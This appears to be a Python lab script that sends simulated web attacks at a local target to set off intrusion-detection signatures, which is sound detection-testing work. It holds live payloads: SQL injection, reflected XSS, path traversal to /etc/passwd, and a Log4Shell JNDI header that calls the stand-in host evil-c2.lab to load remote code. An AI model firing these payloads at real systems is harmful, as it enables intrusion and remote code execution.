"""
Scenario 02: Web Application Attacks (SQLi, XSS, Path Traversal, Log4j RCE)
Triggers:
- SQL Injection UNION SELECT (sid: 1000001 / 2000010)
- Cross-Site Scripting <script> (sid: 1000010 / 2000011)
- Path Traversal /etc/passwd (sid: 1000021 / 2000012)
- Apache Log4j JNDI RCE (sid: 1000040 / 2000013)
- Automated Scanner User-Agent (sid: 1000110)
"""

import sys
import time
import requests


def run_web_attacks(base_url: str = "http://127.0.0.1:3000"):
    print(f"[*] Launching Web Application Attack Vectors against {base_url}...")

    session = requests.Session()

    # 1. SQL Injection UNION SELECT
    print(" -> [1/5] Injecting SQL Injection Payload: ' UNION SELECT 1,2,3,database() --")
    try:
        session.get(f"{base_url}/rest/products/search?q=apple'+UNION+SELECT+1,2,3,4,5,6,7,8,9--", timeout=2.0)
    except Exception:
        pass
    time.sleep(0.5)

    # 2. Cross-Site Scripting (XSS)
    print(" -> [2/5] Injecting Reflected XSS: <script>alert('SOC_LAB_PWNED')</script>")
    try:
        session.get(f"{base_url}/#/search?q=%3Cscript%3Ealert('SOC_LAB_PWNED')%3C/script%3E", timeout=2.0)
    except Exception:
        pass
    time.sleep(0.5)

    # 3. Path Traversal / LFI
    print(" -> [3/5] Requesting Sensitive File: ../../../../etc/passwd")
    try:
        session.get(f"{base_url}/assets/public/images/../../../../etc/passwd", timeout=2.0)
    except Exception:
        pass
    time.sleep(0.5)

    # 4. Log4j / Log4Shell JNDI Exploit
    print(" -> [4/5] Sending Apache Log4j Exploit Header: ${jndi:ldap://evil-c2.lab:1389/Exploit}")
    try:
        headers = {
            "User-Agent": "${jndi:ldap://evil-c2.lab:1389/Exploit}",
            "X-Api-Version": "${jndi:ldap://evil-c2.lab:1389/Exploit}",
        }
        session.get(f"{base_url}/api/v1/health", headers=headers, timeout=2.0)
    except Exception:
        pass
    time.sleep(0.5)

    # 5. Nikto Vulnerability Scanner Simulation
    print(" -> [5/5] Sending Request with Nikto User-Agent")
    try:
        headers = {"User-Agent": "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)"}
        session.get(f"{base_url}/", headers=headers, timeout=2.0)
    except Exception:
        pass

    print("[+] Web application attack scenario completed!")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000"
    run_web_attacks(target)
